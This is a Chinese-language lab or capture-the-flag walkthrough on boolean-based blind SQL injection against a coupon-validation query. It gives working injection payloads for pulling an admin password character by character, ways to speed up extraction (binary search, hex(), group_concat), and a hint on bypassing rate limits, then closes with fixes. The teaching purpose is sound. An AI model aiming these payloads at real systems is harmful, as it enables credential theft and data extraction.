# 优惠券查询处的布尔盲注

## 这一题在教什么

**三个信号全堵上之后，还剩一个布尔值。**

| 信号 | 这一题 |
|---|---|
| 数据回显 | 没有 —— 只回"有效 / 无效"这一句话 |
| 报错回显 | 没有 —— 出错了也回同一句话 |
| 时间信号 | 没有 —— 语句是毫秒级的，真假分不出来 |
| **剩下** | **一个布尔值** |

而这一个布尔值就够了。这一题讲的就是怎么用它把数据一位一位问出来。

> 盲注里**最常见的其实是这一种**，不是时间盲注。
> 因为真实系统里"接口只返回成功/失败"是很普遍的设计 ——
> 而只要真假可观测，数据就出得来。

## 漏洞在哪

`module.py`：

```python
sql = "SELECT 1 FROM coupons WHERE code = '%s'" % typed
valid = con.execute(sql).fetchone() is not None
# 页面只回「有效」或者「无效」
```

## 怎么打通

### 第一步：建立信道

基线是「无效」。想办法让它变「有效」：

```
' OR 1=1 -- 
```

页面从「无效」变成「有效」—— 信道通了。

（顺带：`--` 后面那个空格不能少，它是注释符的一部分。）

### 第二步：把条件换成"从别的表里查出来的"

```
' OR (SELECT 1 FROM users WHERE username='admin'
        AND substr(password,1,1)='v') -- 
```

- 回「有效」→ 猜对了
- 回「无效」→ 猜错了

快慢无所谓，看的是**页面那句话**。

### 第三步：一位一位走完

把 `substr(password,1,1)` 的第二个参数从 1 数到 6。手点 200 多次不现实，写脚本：

```
for pos in 1..6:
    for ch in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = ("' OR (SELECT 1 FROM users WHERE username='admin'"
                   " AND substr(password,%d,1)='%s') -- " % (pos, ch))
        发请求，看回的是「有效」还是「无效」
        if 有效:
            记下 ch; break
```

### 第四步：提交密码

猜完把密码填到页面下面的框里。

## 怎么更快（这一节是重点）

6 位 × 36 个字符 = 最多 216 次请求。以下是把它压下去的办法：

**一、先用 `length()` 问出长度。**

```
' OR (SELECT length(password) FROM users WHERE username='admin')=6 -- 
```

不知道边界的话你得一直试到没结果为止。进一步，长度也能二分：`> 5`。

**二、二分代替逐字符。**

别问"等于哪个"，问"比哪个大"：

```
' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')>'m' -- 
```

36 个字符 → 6 次（`log2(36) ≈ 5.2`）。**一位从 36 次降到 6 次。**

**三、换字符集。**

```
' OR (SELECT substr(hex(password),1,1) FROM users WHERE username='admin')='7' -- 
```

`hex()` 把字符集从 36 个压到 16 个（`0-9a-f`）。而十六进制的每一位
其实携带 4 个 bit —— 理论上一位十六进制字符只要 4 次二分。

同理，用 `unicode()` 问数字也是换字符集的一种。

**四、一次拖一整列。**

如果目标不是单个值而是一整列：

```sql
SELECT group_concat(username || ':' || password, '~') FROM users
```

把它当成**一个长字符串**去问，一次会话就能拿全 —— 不用对每一行重新来一遍。

**五、能回显就别盲注。（最实用的一条）**

先花时间找找：有没有 UNION 的位置？有没有报错回显？
有没有**别的接口**能读到同一份数据？

盲注永远是最后手段 —— 因为它慢得离谱。真实的渗透测试里，
"找一个更快的信道" 花掉的时间，通常比"把盲注写出来"省得多。

| 提速手段 | 从 | 到 |
|---|---|---|
| 二分 | 36 次/位 | 6 次/位 |
| `hex()` + 二分 | 36 次/位 | 4 次/位 |
| 6 位密码总计 | 最多 216 次 | **约 24 次** |

## 怎么修

参数化，跟前几道一样：

```python
con.execute("SELECT 1 FROM coupons WHERE code = ?", (typed,))
```

但这一题值得多说一句：**"没有回显"不是修复。**

很多人的想法是"我把数据藏起来、报错也藏起来，攻击者就没办法了"。
这一题证明了那是错的 —— 只要输入还能影响 SQL 的执行，
**"条件成不成立"本身就是一个输出**。

真正的修复顺序：

1. **参数化**（根治）
2. **查库的账号最小权限**（连 `users` 表都读不到，就没得猜）
3. **限流**：盲注要发成百上千个请求。限流能把成本抬得很高 ——
   但要注意限流本身能被绕过（`X-Forwarded-For`、大小写路径……）
4. **监控**：一个接口被同一个 IP 打了几千次、每次输入都带引号 ——
   这种模式应该被检测出来
